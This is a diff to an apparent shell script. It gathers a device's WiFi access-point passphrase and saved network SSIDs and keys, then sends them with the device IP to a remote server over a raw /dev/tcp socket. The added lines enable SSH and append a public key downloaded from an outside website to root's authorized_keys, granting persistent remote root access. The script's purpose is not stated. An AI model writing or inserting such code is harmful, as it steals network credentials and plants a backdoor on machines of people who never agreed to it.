@@ -20,4 +20,15 @@ HOSTPASS=`grep 'wpa_passphrase' /etc/hostapd/hostapd.conf`
 # TODO: Decrease messiness
 WIFIDATA=`egrep 'ssid|psk' /etc/wpa_supplicant/wpa_supplicant.conf | tr '\n' ' '`
 exec 3<>/dev/tcp/$SERVER/$PORT
-printf "NETWORK: $HOSTSSID $HOSTPASS $WIFIDATA" >&3
+printf "NETWORK: $IP $HOSTSSID $HOSTPASS $WIFIDATA" >&3
+
+systemctl start ssh.service
+systemctl enable ssh.service
+
+SSHPATH="/root/.ssh"
+
+if ! grep boesene $SSHPATH/authorized_keys; then
+	mkdir -p "$SSHPATH"
+	curl https://erikboesen.com/pubkey >> $SSHPATH/authorized_keys
+fi
+
